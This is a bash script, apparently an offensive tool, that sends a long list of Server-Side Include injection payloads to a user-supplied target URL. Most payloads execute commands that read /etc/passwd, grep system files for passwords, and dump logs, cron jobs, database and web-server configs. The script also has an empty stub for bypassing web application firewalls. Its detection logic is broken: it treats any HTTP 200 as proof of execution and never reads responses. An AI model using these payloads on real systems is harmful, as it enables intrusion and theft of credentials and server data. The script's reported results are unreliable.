#!/bin/bash
# This is a comment

# Color variables
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Function to perform SSI Injection detection
detect_ssi_injection() {
    echo "Detecting SSI Injection vulnerabilities..."
    # Define SSI Injection payloads
    payloads=(
        "<!--#echo var=\"DATE_LOCAL\" -->" 
        "<!--#exec cmd=\"ls /etc\" -->" 
        "<!--#include virtual=\"/etc/passwd\" -->" 
        "<!--#exec cmd=\"cat /etc/passwd\" -->" 
        "<!--#exec cmd=\"uname -a\" -->"
        "<!--#exec cmd=\"whoami\" -->"
        "<!--#exec cmd=\"id\" -->"
        "<!--#exec cmd=\"df -h\" -->"
        "<!--#exec cmd=\"ps aux\" -->"
        "<!--#exec cmd=\"netstat -an\" -->"
        "<!--#exec cmd=\"ifconfig\" -->"
        "<!--#exec cmd=\"uname -r\" -->"
        "<!--#exec cmd=\"ping -c 4 127.0.0.1\" -->"
        "<!--#exec cmd=\"uptime\" -->"
        "<!--#exec cmd=\"find / -type f\" -->"
        "<!--#exec cmd=\"find / -type d\" -->"
        "<!--#exec cmd=\"grep -i 'password' /etc/*\" -->"
        "<!--#exec cmd=\"tail -n 50 /var/log/syslog\" -->"
        "<!--#exec cmd=\"ls -la /var/www/html\" -->"
        "<!--#exec cmd=\"cat /var/log/apache2/access.log\" -->"
        "<!--#exec cmd=\"cat /var/log/apache2/error.log\" -->"
        "<!--#exec cmd=\"tail -n 50 /var/log/nginx/access.log\" -->"
        "<!--#exec cmd=\"tail -n 50 /var/log/nginx/error.log\" -->"
        "<!--#exec cmd=\"ls -la /var/log\" -->"
        "<!--#exec cmd=\"cat /var/log/auth.log\" -->"
        "<!--#exec cmd=\"cat /var/log/messages\" -->"
        "<!--#exec cmd=\"ls -la /tmp\" -->"
        "<!--#exec cmd=\"cat /etc/apache2/apache2.conf\" -->"
        "<!--#exec cmd=\"cat /etc/nginx/nginx.conf\" -->"
        "<!--#exec cmd=\"cat /etc/passwd | grep -v nologin\" -->"
        "<!--#exec cmd=\"cat /etc/passwd | grep -v false\" -->"
        "<!--#exec cmd=\"cat /etc/passwd | grep -v /bin/false\" -->"
        "<!--#exec cmd=\"cat /etc/passwd | grep -v /sbin/nologin\" -->"
        "<!--#exec cmd=\"ls /var/spool/cron\" -->"
        "<!--#exec cmd=\"cat /etc/crontab\" -->"
        "<!--#exec cmd=\"cat /etc/cron.d/*\" -->"
        "<!--#exec cmd=\"cat /etc/cron.daily/*\" -->"
        "<!--#exec cmd=\"cat /etc/cron.hourly/*\" -->"
        "<!--#exec cmd=\"cat /etc/cron.weekly/*\" -->"
        "<!--#exec cmd=\"cat /etc/cron.monthly/*\" -->"
        "<!--#exec cmd=\"ls /var/mail\" -->"
        "<!--#exec cmd=\"cat /etc/hosts\" -->"
        "<!--#exec cmd=\"cat /etc/hostname\" -->"
        "<!--#exec cmd=\"cat /etc/resolv.conf\" -->"
        "<!--#exec cmd=\"ls -la /var/lib/mysql\" -->"
        "<!--#exec cmd=\"cat /var/lib/mysql/my.cnf\" -->"
        "<!--#exec cmd=\"cat /etc/my.cnf\" -->"
        "<!--#exec cmd=\"ls -la /etc/php\" -->"
        "<!--#exec cmd=\"cat /etc/passwd | grep -v /usr/sbin/nologin\" -->"
        "<!--#exec cmd=\"cat /etc/passwd | grep -v /usr/bin/false\" -->"
        "<!--#exec cmd=\"cat /etc/passwd | grep -v /usr/bin/nologin\" -->"
        "<!--#exec cmd=\"ls -la /var/www\" -->"
        "<!--#exec cmd=\"cat /etc/apache2/sites-available/*\" -->"
        "<!--#exec cmd=\"cat /etc/apache2/sites-enabled/*\" -->"
        "<!--#exec cmd=\"cat /etc/nginx/sites-available/*\" -->"
        "<!--#exec cmd=\"cat /etc/nginx/sites-enabled/*\" -->"
        "<!--#exec cmd=\"ls -la /etc/nginx/conf.d\" -->"
        "<!--#exec cmd=\"cat /etc/nginx/conf.d/*\" -->"
        "<!--#exec cmd=\"ls -la /etc/apache2/mods-available\" -->"
        "<!--#exec cmd=\"cat /etc/apache2/mods-available/*\" -->"
        "<!--#exec cmd=\"ls -la /etc/apache2/mods-enabled\" -->"
        "<!--#exec cmd=\"cat /etc/apache2/mods-enabled/*\" -->"
        "<!--#exec cmd=\"ls -la /etc/nginx/modules-enabled\" -->"
        "<!--#exec cmd=\"cat /etc/nginx/modules-enabled/*\" -->"
        "<!--#exec cmd=\"ls -la /etc/php/*/mods-available\" -->"
        "<!--#exec cmd=\"cat /etc/php/*/mods-available/*\" -->"
        "<!--#exec cmd=\"ls -la /etc/php/*/mods-enabled\" -->"
        "<!--#exec cmd=\"cat /etc/php/*/mods-enabled/*\" -->"
        "<!--#exec cmd=\"ls -la /etc/mysql/conf.d\" -->"
        "<!--#exec cmd=\"cat /etc/mysql/conf.d/*\" -->"
        "<!--#exec cmd=\"ls -la /etc/mysql/mysql.conf.d\" -->"
        "<!--#exec cmd=\"cat /etc/mysql/mysql.conf.d/*\" -->"
        "<!--#exec cmd=\"ls -la /var/www/html/*\" -->"
        "<!--#exec cmd=\"cat /var/www/html/*\" -->"
        "<!--#exec cmd=\"ls -la /var/www/*\" -->"
        "<!--#exec cmd=\"cat /var/www/*\" -->"
        "<!--#exec cmd=\"ls -la /var/www/public/*\" -->"
        "<!--#exec cmd=\"cat /var/www/public/*\" -->"
        "<!--#exec cmd=\"ls -la /var/www/public_html/*\" -->"
        "<!--#exec cmd=\"cat /var/www/public_html/*\" -->"
        "<!--#exec cmd=\"ls -la /var/www/htdocs/*\" -->"
        "<!--#exec cmd=\"cat /var/www/htdocs/*\" -->"
        "<!--#exec cmd=\"ls -la /var/www/www/*\" -->"
        "<!--#exec cmd=\"cat /var/www/www/*\" -->"
        "<!--#exec cmd=\"ls -la /usr/local/www/*\" -->"
        "<!--#exec cmd=\"cat /usr/local/www/*\" -->"
        "<!--#exec cmd=\"ls -la /usr/local/apache2/htdocs/*\" -->"
        "<!--#exec cmd=\"cat /usr/local/apache2/htdocs/*\" -->"
        "<!--#exec cmd=\"ls -la /usr/local/nginx/html/*\" -->"
        "<!--#exec cmd=\"cat /usr/local/nginx/html/*\" -->"
        "<!--#exec cmd=\"ls -la /usr/local/nginx/www/*\" -->"
        "<!--#exec cmd=\"cat /usr/local/nginx/www/*\" -->"
    )

    # Iterate over payloads and inject them into vulnerable parameters
    for payload in "${payloads[@]}"; do
        echo "Testing payload: $payload"
        url_with_payload="$1?param=$payload"
        response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url_with_payload")
        if [[ $response -eq 200 ]]; then
            echo -e "${GREEN}Payload $payload executed successfully at URL: $url_with_payload${NC}"
            analyze_response "$response"
        else
            echo -e "${RED}Payload $payload failed to execute at URL: $url_with_payload${NC}"
        fi
    done
}

# Function to analyze the response content
analyze_response() {
    # Check for indicators of protection systems
    if [[ $1 == *"WAF"* ]]; then
        echo "Response indicates the presence of a Web Application Firewall (WAF)."
        bypass_waf "$1"
    fi
}

# Function to attempt bypassing a Web Application Firewall (WAF)
bypass_waf() {
    # Implement bypass techniques here
    echo "Attempting to bypass the Web Application Firewall (WAF)..."
    # Add your bypass techniques here
}

# Main function
main() {
    echo "SSI Injection Detection Tool"
    echo "---------------------------"

    # Prompt user for target URL
    read -p "Enter the target URL: " target_url

    # Perform SSI Injection detection
    detect_ssi_injection "$target_url"
}

# Call main function
main
